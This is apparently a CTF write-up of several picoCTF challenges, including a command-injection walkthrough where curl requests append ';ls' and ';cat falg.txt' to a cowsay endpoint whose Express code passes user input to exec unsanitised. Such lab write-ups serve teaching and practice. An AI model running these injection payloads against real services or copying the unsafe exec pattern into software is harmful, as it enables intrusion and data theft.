# General / Misc writeup

I will put those questions which I think not "deep-in-the-rabbit-hole" here.

## Scavenger Hunt

`robots.txt` (prevent indexing), `.htaccess` (Apache server config - should not be accessed from client-side) and `.DS_Store` files.

Kind of know it or search it question.

## CaaS

Command line injection - seriously, real applications having this problem is doomed.

Source code of the app:

```js
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});

```

The problem is in the line: ``exec(`/usr/games/cowsay ${req.params.message}`, ...``

It will just run any shell command after adding `;`

Example: (format like bash script)

```bash
$ /usr/games/cowsay gachiBASS  # probably harmless but...

$ /usr/games/cowsay gachiBASS;ls  # We can run everything as that user (whoami)
# By the way the program crashs if you start with ; immediately, so just add something for the cow to output
```

To get the flag:

```bash
$ curl 'https://caas.mars.picoctf.net/cowsay/gachiBASS;ls'
 ___________
< gachiBASS >
 -----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock

$ curl 'https://caas.mars.picoctf.net/cowsay/gachiBASS;cat%20falg.txt'  # need to URL encode the space, Firefox's inspector helps a lot
 ___________
< gachiBASS >
 -----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{cow_flag}
```

## Download / Mirror the whole website (Search source)

Reference: <https://alvinalexander.com/linux-unix/how-to-make-offline-mirror-copy-website-with-wget/>

The hint is: `How could you mirror the website on your local machine so you could use more powerful tools for searching?`

Didn't know `wget` can do so much...

```bash
# convert-links and html-extension options are not really needed for this question
$ wget --mirror            \
     --convert-links     \
     --html-extension    \
     --wait=2            \
     -o dl_log              \
     http://saturn.picoctf.net:61941/

# It takes some time to download the website

$ cd saturn.picoctf.net:61941/  # cd is not really needed
$ grep "picoCTF{" --recursive
css/style.css:/** banner_main picoCTF{that_flag} **/
```

This is useful in all the hide-and-seek plaintext search flag questions.

## PostgreSQL SQL Server

Enter the server following its instructions

```bash
# pico is the db name, username is postgres
psql -h saturn.picoctf.net -p 62606 -U postgres pico

pico=# \dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)

# Now enter the normal SQL statements
pico=# SELECT * FROM flags;
 id | firstname | lastname  |                address
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{that_postgre_SQL_flag}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 rows)

```
